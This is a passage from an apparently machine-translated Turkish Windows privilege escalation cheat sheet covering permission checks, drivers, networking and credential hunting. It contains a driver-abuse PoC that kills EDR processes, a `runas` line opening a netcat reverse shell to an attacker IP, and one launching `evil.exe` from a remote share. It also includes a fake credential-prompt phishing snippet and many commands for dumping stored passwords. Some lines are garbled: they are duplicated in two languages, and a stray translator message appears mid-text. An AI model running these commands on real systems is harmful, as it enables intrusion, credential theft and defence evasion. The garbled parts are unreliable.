accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Başlangıçta çalıştır

**Farklı bir kullanıcı tarafından çalıştırılacak bazı registry veya binary'leri üzerine yazıp yazamayacağınızı kontrol edin.**\
**Oku** aşağıdaki **sayfayı** ilginç **autoruns locations to escalate privileges** hakkında daha fazla bilgi edinmek için:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Drivers

Olası **third party weird/vulnerable** drivers için bakın
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
Eğer bir driver rastgele bir kernel read/write primitive açığa çıkarıyorsa (zayıf tasarlanmış IOCTL handler'larında yaygın), doğrudan kernel belleğinden bir SYSTEM token çalarak yetki yükseltebilirsiniz. Adım adım teknik için bakınız:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Device object'larında FILE_DEVICE_SECURE_OPEN eksikliğinin kötüye kullanılması (LPE + EDR kill)

Bazı imzalı üçüncü taraf driver'lar device object'larını IoCreateDeviceSecure aracılığıyla güçlü bir SDDL ile oluşturuyor fakat DeviceCharacteristics içinde FILE_DEVICE_SECURE_OPEN'u ayarlamayı unutuyorlar. Bu bayrak olmadan, secure DACL, cihaza ek bir bileşen içeren bir yol üzerinden erişildiğinde uygulanmaz; bu da herhangi bir yetkisiz kullanıcının aşağıdaki gibi bir namespace yolu kullanarak bir handle elde etmesine izin verir:

- \\.\DeviceName\anything
- \\.\amsdk\anyfile (gerçek dünyadan bir vaka)

Kullanıcı cihazı açabildiğinde, driver tarafından açığa çıkarılan ayrıcalıklı IOCTL'lar LPE ve tahrifat için kötüye kullanılabilir. Gerçekte gözlemlenmiş örnek yetenekler:
- Rastgele süreçlere tam erişimli handle'lar döndürme (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Sınırsız raw disk read/write (offline tahrifat, boot-time persistence tricks).
- Protected Process/Light (PP/PPL) dahil rastgele süreçleri sonlandırma; bu sayede AV/EDR'yi userland üzerinden kernel aracılığıyla öldürme mümkün olur.

Minimal PoC şablonu (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
Geliştiriciler için mitigasyonlar
- DACL ile kısıtlanması amaçlanan device object'leri oluştururken her zaman FILE_DEVICE_SECURE_OPEN'u ayarlayın.
- Ayrıcalıklı işlemler için çağıranın bağlamını doğrulayın. process termination veya handle returns'a izin vermeden önce PP/PPL kontrolleri ekleyin.
- IOCTLs'ı sınırlandırın (access masks, METHOD_*, input validation) ve doğrudan kernel ayrıcalıkları yerine brokered modelleri düşünün.

Savunmacılar için tespit fikirleri
- Şüpheli device isimlerinin user-mode tarafından açılmalarını (e.g., \\ .\\amsdk*) ve kötüye kullanımı işaret eden belirli IOCTL dizilerini izleyin.
- Microsoft’un vulnerable driver blocklist'ini (HVCI/WDAC/Smart App Control) uygulayın ve kendi izin/engelleme listelerinizi yönetin.

## PATH DLL Hijacking

Eğer **write permissions inside a folder present on PATH**'a sahipseniz, bir process tarafından yüklenen bir DLL'i hijack ederek **escalate privileges** elde edebilirsiniz.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Bu kontrolün nasıl kötüye kullanılacağı hakkında daha fazla bilgi için:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Ağ

### Paylaşımlar
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file içinde sabit kodlanmış diğer bilinen bilgisayarları kontrol edin
```
type C:\Windows\System32\drivers\etc\hosts
```
### Ağ Arayüzleri ve DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

Dışarıdan **kısıtlı servisleri** kontrol edin
```bash
netstat -ano #Opened ports?
```
### Yönlendirme Tablosu
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP Tablosu
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### Firewall Rules

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(kuralları listeleme, kural oluşturma, kapatma, kapatma...)**

Daha fazla[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
İkili `bash.exe` ayrıca `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` içinde bulunabilir

Eğer root kullanıcı olursanız herhangi bir portu dinleyebilirsiniz (ilk kez `nc.exe` ile bir portu dinlediğinizde, GUI aracılığıyla `nc`'nin güvenlik duvarı tarafından izin verilip verilmeyeceğini sorar).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
bash'i root olarak kolayca başlatmak için `--default-user root` deneyebilirsiniz

`WSL` dosya sistemini şu klasörde keşfedebilirsiniz: `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows Kimlik Bilgileri

### Winlogon Kimlik Bilgileri
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### Credentials manager / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault, sunucular, web siteleri ve diğer programlar için kullanıcı kimlik bilgilerini saklar; bu kimlik bilgileri **Windows**'un **kullanıcıları otomatik olarak oturum açtırabilmesi** için kullanılır. İlk bakışta, kullanıcıların Facebook, Twitter, Gmail vb. kimlik bilgilerini saklayıp tarayıcılar aracılığıyla otomatik olarak giriş yapmalarını sağladığı düşünülebilir. Ancak durum böyle değildir.

Windows Vault, **Windows'un kullanıcıları otomatik olarak oturum açtırabileceği** kimlik bilgilerini sakladığı için, herhangi bir **kaynağa (sunucu veya web sitesi) erişmek için kimlik bilgisine ihtiyaç duyan Windows uygulamasının** bu Credential Manager & Windows Vault'u **kullanarak** sağlanan kimlik bilgilerini, kullanıcıların her seferinde kullanıcı adı ve şifre girmesi yerine kullanabilmesi anlamına gelir.

Uygulamalar Credential Manager ile etkileşime geçmedikçe, belirli bir kaynak için kimlik bilgilerini kullanmaları mümkün olmaz diye düşünüyorum. Bu yüzden, uygulamanız vault'u kullanmak istiyorsa, varsayılan depolama vault'undan o kaynak için kimlik bilgilerini **credential manager ile iletişim kurup talep etmelidir**.

Makinede saklanan kimlik bilgilerini listelemek için `cmdkey` kullanın.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
Daha sonra kaydedilmiş kimlik bilgilerini kullanmak için `runas`'ı `/savecred` seçeneğiyle kullanabilirsiniz. Aşağıdaki örnek, bir SMB paylaşımı üzerinden uzak bir binary çağırıyor.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
Verilen kimlik bilgileriyle `runas` kullanma.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
Note that mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), or from [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

The **Data Protection API (DPAPI)**, verilerin simetrik şifrelemesi için bir yöntem sağlar; özellikle Windows işletim sistemi içinde asimetrik özel anahtarların simetrik şifrelemesinde kullanılır. Bu şifreleme, entropiye önemli katkı sağlayan bir kullanıcı veya sistem gizli bilgisi kullanır.

**DPAPI, kullanıcı giriş sırlarından türetilen bir simetrik anahtar aracılığıyla anahtarların şifrelenmesini sağlar**. Sistem şifrelemesi içeren senaryolarda, sistemin domain kimlik doğrulama sırlarını kullanır.

DPAPI kullanılarak şifrelenmiş kullanıcı RSA anahtarları, `%APPDATA%\Microsoft\Protect\{SID}` dizininde saklanır; burada `{SID}` kullanıcının [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) temsil eder. **DPAPI anahtarı, kullanıcının özel anahtarlarını koruyan master anahtarla aynı dosyada birlikte bulunur**, tipik olarak 64 bayt rastgele veriden oluşur. (Bu dizine erişimin kısıtlı olduğunu, içeriğinin CMD'de `dir` komutuyla listelenmesine izin verilmediğini ancak PowerShell ile listelenebildiğini not etmek önemlidir).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
Bunu deşifre etmek için uygun argümanlar (`/pvk` veya `/rpc`) ile **mimikatz module** `dpapi::masterkey` kullanabilirsiniz.

**credentials files protected by the master password** genellikle şu konumlarda bulunur:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
You can **extract many DPAPI** **masterkeys** from **memory** with the `sekurlsa::dpapi` module (if you are root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Kimlik Bilgileri

**PowerShell kimlik bilgileri**, şifrelenmiş kimlik bilgilerini pratik şekilde saklamak için sıkça **scripting** ve otomasyon görevlerinde kullanılır. Bu kimlik bilgileri **DPAPI** ile korunur; bu da genellikle oluşturuldukları aynı kullanıcı tarafından aynı bilgisayarda çözülebilecekleri anlamına gelir.

İçeren dosyadan bir PS kimlik bilgisini **çözmek** için şunu yapabilirsiniz:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Kablosuz Ağ
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

Bunları şu konumlarda bulabilirsiniz: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
ve `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### Recently Run Commands
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **Uzak Masaüstü Kimlik Bilgileri Yöneticisi**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
Uygun `/masterkey` ile **Mimikatz** `dpapi::rdg` modülünü kullanarak herhangi bir .rdg dosyasını **şifre çözün**.\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
Mimikatz `sekurlsa::dpapi` modülü ile bellekteki birçok **DPAPI masterkeys**'i çıkarabilirsiniz.

### Sticky Notes

People often use the StickyNotes app on Windows workstations to **save passwords** and other information, not realizing it is a database file.  
Kullanıcılar genellikle Windows iş istasyonlarında StickyNotes uygulamasını, bunun bir veritabanı dosyası olduğunu fark etmeden **save passwords** ve diğer bilgileri saklamak için kullanır.

This file is located at `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` and is always worth searching for and examining.  
Bu dosya `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` konumunda bulunur ve her zaman aranıp incelenmeye değerdir.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**  
**AppCmd.exe**'den passwords kurtarmak için Administrator olmanız ve High Integrity level'da çalıştırmanız gerektiğini unutmayın.\
**AppCmd.exe** is located in the `%systemroot%\system32\inetsrv\` directory.  
**AppCmd.exe** `%systemroot%\system32\inetsrv\` dizininde bulunur.\
If this file exists then it is possible that some **credentials** have been configured and can be **recovered**.  
Eğer bu dosya varsa bazı **credentials** yapılandırılmış olabilir ve **kurtarılabilir**.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` dosyasının varlığını kontrol edin .\
Yükleyiciler **run with SYSTEM privileges**, birçoğu **DLL Sideloading (Info from** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## Dosyalar ve Kayıt Defteri (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH Sunucu Anahtarları
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### SSH anahtarları kayıt defterinde

SSH özel anahtarları `HKCU\Software\OpenSSH\Agent\Keys` kayıt defteri anahtarının içinde depolanabilir, bu yüzden orada ilginç bir şey olup olmadığını kontrol etmelisiniz:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
Eğer o yolun içinde herhangi bir giriş bulursanız muhtemelen kaydedilmiş bir SSH anahtarıdır. Şifrelenmiş olarak saklanır ancak [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) kullanılarak kolayca deşifre edilebilir.\
Bu teknik hakkında daha fazla bilgi burada: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

Eğer `ssh-agent` servisi çalışmıyorsa ve her açılışta otomatik başlamasını istiyorsanız çalıştırın:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> Görünüşe göre bu teknik artık geçerli değil. Bazı ssh anahtarları oluşturmaya, bunları `ssh-add` ile eklemeye ve bir makineye ssh ile giriş yapmaya çalıştım. Kayıt defteri HKCU\Software\OpenSSH\Agent\Keys mevcut değil ve procmon, asimetrik anahtar kimlik doğrulaması sırasında `dpapi.dll` kullanımını tespit etmedi.

### Gözetimsiz dosyalar
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
Bu dosyaları **metasploit** kullanarak da arayabilirsiniz: _post/windows/gather/enum_unattend_

Örnek içerik:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM yedekleri
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### Bulut Kimlik Bilgileri
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

SiteList.xml adlı bir dosyayı arayın **SiteList.xml**

### Önbelleğe Alınmış GPP Parolası

Önceden, Group Policy Preferences (GPP) aracılığıyla bir grup makineye yerel yönetici hesapları dağıtılmasına izin veren bir özellik mevcuttu. Ancak bu yöntemin önemli güvenlik açıkları vardı. Birincisi, SYSVOL içinde XML dosyaları olarak saklanan Group Policy Objects (GPOs) herhangi bir domain kullanıcısı tarafından erişilebiliyordu. İkincisi, bu GPP içindeki parolalar, kamuya açık belgelenmiş bir varsayılan anahtar kullanılarak AES256 ile şifrelenmişti ve herhangi bir doğrulanmış kullanıcı tarafından çözülebiliyordu. Bu, kullanıcıların yükseltilmiş ayrıcalık elde etmesine yol açabilecek ciddi bir risk oluşturuyordu.

Bu riski azaltmak için, "cpassword" alanı boş olmayan yerel olarak önbelleğe alınmış GPP dosyalarını tarayan bir işlev geliştirildi. Böyle bir dosya bulunduğunda, işlev parolayı çözüyor ve özel bir PowerShell nesnesi döndürüyor. Bu nesne GPP ile ilgili ayrıntıları ve dosyanın konumunu içeriyor, böylece bu güvenlik açığının tespitine ve giderilmesine yardımcı oluyor.

Aşağıdaki konumlarda bu dosyaları arayın: `C:\ProgramData\Microsoft\Group Policy\history` veya _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword'i çözmek için:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec kullanarak şifreleri almak:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web Yapılandırması
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
Kimlik bilgileri içeren web.config örneği:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN kimlik bilgileri
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### Günlükler
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials isteyin

Her zaman, eğer kullanıcının bunları bilebileceğini düşünüyorsanız, **kullanıcıdan kendi veya hatta farklı bir kullanıcının credentials'ını girmesini isteyebilirsiniz** (dikkat: istemciye doğrudan **credentials**'ı **sormak** gerçekten **risklidir**):
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **credentials içerebilecek olası dosya adları**

Bir süre önce **passwords**'ı **clear-text** veya **Base64** olarak içeren bilinen dosyalar
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
Çevrilmesini istediğiniz README.md içeriğini veya çevirilecek dosyaların tam listesini gönderin. Mevcut bilgiyle çeviri yapamıyorum.
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin'deki Credentials

Ayrıca Bin'i içindeki credentials için kontrol etmelisiniz

Birçok program tarafından kaydedilen **parolaları geri almak** için şu adresi kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Kayıt Defteri İçinde

**Credentials içeren diğer olası kayıt defteri anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

Şifrelerin saklandığı **Chrome or Firefox** veritabanlarını kontrol etmelisiniz.  
Ayrıca tarayıcıların geçmişini, yer imlerini ve favorilerini kontrol edin; belki bazı **passwords are** oraya depolanmıştır.

Tarayıcılardan şifre çıkarmak için araçlar:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
